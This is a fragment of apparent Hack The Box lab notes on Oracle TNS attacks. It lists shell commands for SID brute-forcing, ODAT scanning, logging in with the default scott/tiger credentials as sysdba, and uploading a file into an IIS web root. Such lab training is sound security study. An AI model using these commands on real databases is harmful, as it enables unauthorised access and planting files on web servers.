...
```shell-session
xF1NN@htb[/htb]$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
...
```shell-session
xF1NN@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
...
```shell-session
xF1NN@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
...
```shell-session
xF1NN@htb[/htb]$ ./odat.py all -s 10.129.204.235
...
```shell-session
xF1NN@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
...
```shell-session
xF1NN@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
...
```shell-session
xF1NN@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
...
```shell-session
xF1NN@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
xF1NN@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
...
```shell-session
xF1NN@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
